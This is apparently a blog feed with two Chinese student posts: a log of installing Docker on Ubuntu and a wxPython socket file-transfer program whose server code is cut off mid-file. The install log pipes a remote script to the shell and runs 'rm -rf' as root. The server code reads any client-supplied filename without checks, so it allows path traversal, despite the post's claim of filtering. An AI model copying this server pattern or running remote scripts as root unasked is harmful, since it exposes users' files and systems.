        <content type="html"><![CDATA[<h2 id="Ubuntu之docker安装："><a href="#Ubuntu之docker安装：" class="headerlink" title="Ubuntu之docker安装："></a>Ubuntu之docker安装：</h2><p>装docker毕竟一般是 CentOS  我之前在大二也是在GentOS上安装的docker，这节课的内容是已经完成过的，在征得老师同意后，我准备在ubuntu上安装一个docker。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 此处的ubuntu环境是我使用一段时间的，各种基础配置已经配置完毕。</span><span class="token comment"># 如操作中出现网络环境 apt更新之类问题请先完成ubuntu环境的配置。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>总之就是一堆报错…..慢慢在修报错的过程……</p><blockquote><p>大部分情况下均需要使用sudo权限，建议直接使用root用户。</p></blockquote><p>第一次尝试： curl -sSL <a href="https://get.daocloud.io/docker">https://get.daocloud.io/docker</a> | sh 使用国内一键安装命令</p><p>一大堆报错，其中有个报错，应该是因为我当时安装过一个低版本的docker.io所以卸载掉就行。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> remove docker docker-engine docker.io containerd runc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>如果之前安装过docker，需要完全卸载docker</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. 删除软件以及安装时自动安装的所有包</span><span class="token function">sudo</span> <span class="token function">apt-get</span> autoremove docker docker-ce docker-engine  docker.io  containerd runc -y<span class="token comment"># 2. 查看docker中其他没有卸载的包</span>dpkg -l <span class="token operator">|</span> <span class="token function">grep</span> docker<span class="token comment"># 3. 卸载没有删除的docker相关插件</span><span class="token function">sudo</span> <span class="token function">apt</span> remove --purge docker-ce -y<span class="token function">sudo</span> <span class="token function">apt-get</span> autoremove docker-ce-* -y<span class="token comment"># 4. 删除docker的相关配置&amp;目录</span><span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/docker<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/containerd<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/run/docker*<span class="token comment"># 5. 确认docker卸载完毕</span>docker --version<span class="token function">which</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>同时apt是无法连接HTTPS连接的，这里我们应该先配置环境使其能够使用https连接。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apt-transport-https ca-certificates <span class="token function">curl</span> gnupg-agent software-properties-common<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二次尝试：</p><blockquote><p>:~$ sudo apt update<br>[sudo] root 的密码：<br>命中:1 <a href="http://archive.ubuntu.com/ubuntu">http://archive.ubuntu.com/ubuntu</a> impish InRelease<br>获取:2 <a href="http://cn.archive.ubuntu.com/ubuntu">http://cn.archive.ubuntu.com/ubuntu</a> bionic-updates InRelease [88.7 kB]<br>错误:2 <a href="http://cn.archive.ubuntu.com/ubuntu">http://cn.archive.ubuntu.com/ubuntu</a> bionic-updates InRelease<br>  由于没有公钥，无法验证下列签名： NO_PUBKEY XXXXXXXXXXXX<br>命中:3 <a href="http://archive.ubuntu.com/ubuntu">http://archive.ubuntu.com/ubuntu</a> impish-updates InRelease<br>命中:4 <a href="http://archive.ubuntu.com/ubuntu">http://archive.ubuntu.com/ubuntu</a> impish-backports InRelease<br>命中:5 <a href="http://archive.ubuntu.com/ubuntu">http://archive.ubuntu.com/ubuntu</a> impish-security InRelease<br>已下载 88.7 kB，耗时 14秒 (6,354 B/s)<br>正在读取软件包列表… 完成<br>正在分析软件包的依赖关系树… 完成<br>正在读取状态信息… 完成<br>有 1157 个软件包可以升级。请执行 ‘apt list –upgradable’ 来查看它们。<br>W: 校验数字签名时出错。此仓库未被更新，所以仍然使用此前的索引文件。GPG 错误：<a href="http://cn.archive.ubuntu.com/ubuntu">http://cn.archive.ubuntu.com/ubuntu</a> bionic-updates InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY 3B4FE6ACC0B21F32<br>W: 无法下载 <a href="http://cn.archive.ubuntu.com/ubuntu/dists/bionic-updates/InRelease">http://cn.archive.ubuntu.com/ubuntu/dists/bionic-updates/InRelease</a>  由于没有公钥，无法验证下列签名： NO_PUBKEY 3B4FE6ACC0B21F32<br>W: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。</p><p>gpg：警告：homedir’/home/user/.gnupg’上的所有权不安全</p></blockquote><p>一大堆警告，一个一个解决吧，没有公钥就添加公钥，    从网上找到解决办法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> apt-key adv --keyserver keyserver.ubuntu.com --recv-keys XXXXXXXXXXXXXXXX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是在我的虚拟机上又有了新的报错</p><blockquote><p> Executing: /tmp/apt-key-gpghome.pOvnFYETfm/gpg.1.sh –keyserver keyserver.ubundu.com –recv-keys XXXXXXXXXXXX</p><p>gpg: 从公钥服务器接收失败：Server indicated a failure</p></blockquote><p>还是在网络上找到了新的解决方法</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv XXXXXXXXXXXXXXXX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参照网络上的内容应该能正常导入缺少的秘钥，但我这边</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Executing: /tmp/apt-key-gpghome.9YTKc9ICOA/gpg.1.sh --keyserver hkp://keyserver.ubuntu.com:80 --recv EB3E94ADBE1229CFgpg: 密钥 EB3E94ADBE1229CF：公钥 “Microsoft <span class="token punctuation">(</span>Release signing<span class="token punctuation">)</span> <span class="token operator">&lt;</span>gpgsecurity@microsoft.com<span class="token operator">></span>” 已导入gpg: 处理的总数：1gpg:               未导入：1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>明显没有成功。继续寻找解决办法</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -fsSL https://download.docker.com/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> - <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行之后继续执行：</p><blockquote><p> apt-get update 执行已经正常</p><p>  apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin   <em># 安装最新版的docker</em> </p></blockquote><center><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1663808649627.png" alt="1663808649627" style="zoom:40%;" /></center>也不是很麻烦，大概......]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络实训之简单文件传输系统器</title>
      <link href="/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/"/>
      <url>/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>只能说计算机网络实训那一周我是真的难受，不仅仅有我自己的实训任务还有别人的，自己这个任务一实际上是第一天就写完了的，大部分的时间是在做网络的一些内容，以及同组其他成员的可视化。</p><hr><p>[TOC]</p><h2 id="简单文件传输系统器"><a href="#简单文件传输系统器" class="headerlink" title="简单文件传输系统器"></a>简单文件传输系统器</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本文件传输系统为一款实现内网文件传输的类FTP协议软件，由Python语言开发。客户端程序与服务器端程序分别运行局域网内不同主机上，实现客户端与服务器端的文件传输功能。</p><h3 id="服务器界面："><a href="#服务器界面：" class="headerlink" title="服务器界面："></a>服务器界面：</h3><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/09/08/计算机网络实训/wps1.jpg"style="zoom:80%;" /><center> <center>图1-1 文件传输系统服务端</center>该界面包括开始等待下载按钮和选择共享文件夹按钮。<p>本程序是一款通过服务器客户端的方式实现一个类FTP协议下载功能的应用软件。</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/09/08/计算机网络实训/wps2.jpg" style="zoom:80%;" /> </center><center>图1-2 共享文件夹选择页面</center><p>点击选择共享文件夹按钮后，路径选择界面，选择文件夹作为共享文件夹，客户端可以自由获取该文件夹下的文件。同时服务器端会读取当前共享文件夹路径下的所有文件名，写入文件菜单.txt中。</p><p>在选择好共享文件后，点击开始等待下载，程序通过点击，服务器进入被动等待，同时服务器会进行弹窗展示自己的IP地址（内网地址）</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/09/08/计算机网络实训/wps3.jpg" style="zoom:80%;" /> </center><center>图1-3 弹窗显示服务器内网IP地址</center><p>在此之后，服务器端将等待客户端与其建立连接，连接建立后将持续等待客户端发送文件下载请求，但同一时间只能与一个客户端建立连接。</p><h3 id="客户端界面"><a href="#客户端界面" class="headerlink" title="客户端界面"></a>客户端界面</h3><p>首先运行客户端后，会进入客户端页面，如图2-1所示。 </p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/09/08/计算机网络实训/wps4.jpg" style="zoom:80%;" /> </center><center>图2-1 客户端页面</center><p>该界面包括对应的服务器IP地址输入栏，文件输入栏。还有下载按钮和文件存放地址设置按钮。在服务器开启后依次输入输入服务器IP地址，与需要下载的文件，设置文件存放地址，点击下载程序将自动链接服务器，下载需下载的文件。</p><p>执行程序时，应先下载文件菜单.txt文件，以获悉共享文件夹下的内容。</p><p>当文件完成下载时会进行弹窗提示，用户可继续通过当前客户端下载服务器共享文件夹下的其他文件。</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/09/08/计算机网络实训/wps5.jpg" style="zoom:80%;" /> </center><center>图2-2文件下载完成后的相应提示</center><h3 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h3><p>本项目使用Python语言开发，使用 PyCharm编译器进行开发。使用WxPython库进行可视化界面制作，同时以socket,Json，struct等支持库进行服务器与客户端的链接。</p><p>在开发过程中，客户端程序与服务器端程序分开进行开发。</p><h3 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h3><ol><li><p>在使用时请在服务器地址下放置需要客户端下载的内容</p></li><li><p>由于使用支持库socket的限制，本程序只能实现在同一子网下不同主机间的通信，无法实现对内网的穿透实现外网通信。</p></li><li><p>由于windows计算机防火墙的存在，在设计传输程序的过程中，一直选用8000端口作为通信端口，同时手动开启服务器该端口号，只有服务器固定端口号打开时程序才能顺利运行。</p></li><li><p>客户端输入IP地址应为局域网内的内网地址，即程序运行过程中服务器端提示地址（原因见注意事项1）。</p></li><li><p>在实际应用时，进行了一些简单的过滤，避免客户端通过简单注入即可危害服务器信息安全（读取到不应读取的内容）。</p></li></ol><h3 id="服务器代码："><a href="#服务器代码：" class="headerlink" title="服务器代码："></a>服务器代码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json   <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">getIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"8.8.8.8"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip<span class="token operator">=</span>s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> ip<span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>getIP<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">)</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'简单文件传输器（服务器）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'开始等待下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'简单文件传输器'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                 style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>port<span class="token operator">=</span><span class="token number">8000</span>        <span class="token comment"># 设置默认端口号为8848 钛合金手机</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                                   label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'选择共享文件夹'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>share_dir<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"服务器的IP地址为："</span><span class="token operator">+</span>self<span class="token punctuation">.</span>ip<span class="token operator">+</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"IP地址显示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>        phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            conn<span class="token punctuation">,</span> client <span class="token operator">=</span> phone<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                    <span class="token comment"># 收命令</span>                    res <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8096</span><span class="token punctuation">)</span>                    <span class="token comment"># 解析命令、提取相应的命令参数</span>                    cmds <span class="token operator">=</span> res<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ['get','a.txt']  split变列表格式</span>                    filename <span class="token operator">=</span> cmds<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>                    <span class="token comment"># 已读的方式打开文件，读取文件内容发送给客户端</span>                    <span class="token comment"># 第一步：制作固定长度的报头</span>                    header_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                        <span class="token string">'filename'</span><span class="token punctuation">:</span> filename<span class="token punctuation">,</span>                        <span class="token string">'file_size'</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span><span class="token string">r'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment"># 这里把文件的名字和地址结合在一起得到文件长度</span>                    <span class="token punctuation">&#125;</span>  <span class="token comment"># 字典方便储存数据</span>                    header_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>  <span class="token comment"># 把字典转换成js格式(字符串类型)</span>                    header_bytes <span class="token operator">=</span> header_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>                    <span class="token comment"># 第二步：先发送报头的长度</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token comment"># 第三步：再发报头</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span>                    <span class="token comment"># 第四步：发送真实数据</span>                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>                            <span class="token comment"># 这样一行一行发比直接发送f.read节省内存空间</span>                            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment"># except ConnectionResetError as err:</span>                    <span class="token comment"># break</span>                    <span class="token keyword">break</span>        phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">bjk1_axEnterj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('bjk1,按下Enter键')</span>        <span class="token comment"># print(self.share_dir)</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an2,按钮被单击')</span>        dialog <span class="token operator">=</span> wx<span class="token punctuation">.</span>DirDialog<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"打开文件夹"</span><span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>DD_CHANGE_DIR<span class="token punctuation">)</span>        <span class="token keyword">if</span> dialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_OK<span class="token punctuation">:</span>            filename <span class="token operator">=</span> dialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>share_dir<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            img_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>img_list<span class="token punctuation">)</span>            <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'文件菜单.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>  <span class="token comment"># 创建文件，权限为写入</span>            <span class="token keyword">for</span> img_name <span class="token keyword">in</span> img_list<span class="token punctuation">:</span>                <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_name <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>            toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"文件菜单已创建"</span><span class="token punctuation">,</span> <span class="token string">"软件提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>            <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>                <span class="token comment"># 如果点击了提示框的确定按钮</span>                toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 则关闭提示框</span>            dialog<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 